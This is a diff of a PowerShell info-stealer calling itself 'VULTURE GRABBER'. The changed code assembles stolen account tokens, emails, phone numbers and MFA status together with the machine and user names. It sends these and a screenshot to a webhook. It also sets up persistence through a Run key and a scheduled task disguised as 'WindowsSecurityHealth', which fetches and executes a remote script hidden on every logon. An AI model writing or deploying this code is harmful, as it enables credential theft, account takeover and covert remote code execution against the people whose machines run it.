@@ -209,47 +209,53 @@ $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
 $bytes = $ms.ToArray()
 $ms.Close()
 
-# === SEND TO WEBHOOK IN BACKGROUND ===
+# === SEND TO WEBHOOK ===
 if ($firstRun) {
-    Start-Job -ScriptBlock {
-        param($hook, $validTokens, $bytes, $pc, $user)
-        $report = "**[VULTURE GRABBER]**`nPC: $pc`nUser: $user`nValid Tokens: $($validTokens.Count)`n`n"
-        foreach ($ti in $validTokens) {
-            $report += "**$($ti.u)**`nToken: ``$($ti.token)```nID: $($ti.id)`nEmail: $($ti.em)`nPhone: $($ti.ph)`nNitro/MFA: $($ti.ni)/$($ti.mf)`n`n"
-        }
-        
+    $report = "**[VULTURE GRABBER]**`nPC: $env:COMPUTERNAME`nUser: $env:USERNAME`nValid Tokens: $($validTokens.Count)`n`n"
+    
+    # Build token list
+    foreach ($ti in $validTokens) {
+        $report += "**$($ti.u)**`nToken: ``$($ti.token)```nID: $($ti.id)`nEmail: $($ti.em)`nPhone: $($ti.ph)`nNitro/MFA: $($ti.ni)/$($ti.mf)`n`n"
+    }
+
+    # Send main message
+    try {
+        Invoke-RestMethod -Uri $hook -Method Post -Body @{content=$report} -ErrorAction SilentlyContinue
+    } catch {}
+
+    # Send screenshot if exists
+    if ($bytes) {
         try {
-            Invoke-RestMethod -Uri $hook -Method Post -Body @{content=$report} -ErrorAction SilentlyContinue
+            $boundary = "----VultureBoundary" + (Get-Random).ToString()
+            $LF = "`r`n"
+            $body = (
+                "--$boundary$LF" +
+                "Content-Disposition: form-data; name=`"file`; filename=`"screenshot.png`"$LF" +
+                "Content-Type: image/png$LF$LF"
+            )
+            $footer = "$LF--$boundary--$LF"
+            
+            $headerBytes = [Text.Encoding]::ASCII.GetBytes($body)
+            $footerBytes = [Text.Encoding]::ASCII.GetBytes($footer)
+            $totalLength = $headerBytes.Length + $bytes.Length + $footerBytes.Length
+            
+            $webRequest = [Net.WebRequest]::Create($hook)
+            $webRequest.Method = "POST"
+            $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
+            $webRequest.ContentLength = $totalLength
+            
+            $reqStream = $webRequest.GetRequestStream()
+            $reqStream.Write($headerBytes, 0, $headerBytes.Length)
+            $reqStream.Write($bytes, 0, $bytes.Length)
+            $reqStream.Write($footerBytes, 0, $footerBytes.Length)
+            $reqStream.Close()
+            $webRequest.GetResponse()
         } catch {}
-        
-        if ($bytes) {
-            try {
-                $boundary = "----VultureBoundary" + (Get-Random).ToString()
-                $LF = "`r`n"
-                $body = "--$boundary$LFContent-Disposition: form-data; name=`"file`; filename=`"screenshot.png`"$LFContent-Type: image/png$LF$LF"
-                $footer = "$LF--$boundary--$LF"
-                $headerBytes = [Text.Encoding]::ASCII.GetBytes($body)
-                $footerBytes = [Text.Encoding]::ASCII.GetBytes($footer)
-                $totalLength = $headerBytes.Length + $bytes.Length + $footerBytes.Length
-                
-                $webRequest = [Net.WebRequest]::Create($hook)
-                $webRequest.Method = "POST"
-                $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
-                $webRequest.ContentLength = $totalLength
-                
-                $reqStream = $webRequest.GetRequestStream()
-                $reqStream.Write($headerBytes, 0, $headerBytes.Length)
-                $reqStream.Write($bytes, 0, $bytes.Length)
-                $reqStream.Write($footerBytes, 0, $footerBytes.Length)
-                $reqStream.Close()
-                $webRequest.GetResponse()
-            } catch {}
-        }
-    } -ArgumentList $hook, $validTokens, $bytes, $env:COMPUTERNAME, $env:USERNAME
+    }
 }
 
 # === PERSISTENCE ===
-$cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command `"iex(irm 'https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1')`""
+$cmd = "powershell.exe -nologo -ep bypass -w hidden -c `"iex(irm 'https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1')`""
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityHealth" -Value $cmd -ErrorAction SilentlyContinue
 schtasks /create /tn "WindowsSecurityHealth" /tr "$cmd" /sc onlogon /f /rl highest /it > $null 2>&1
 
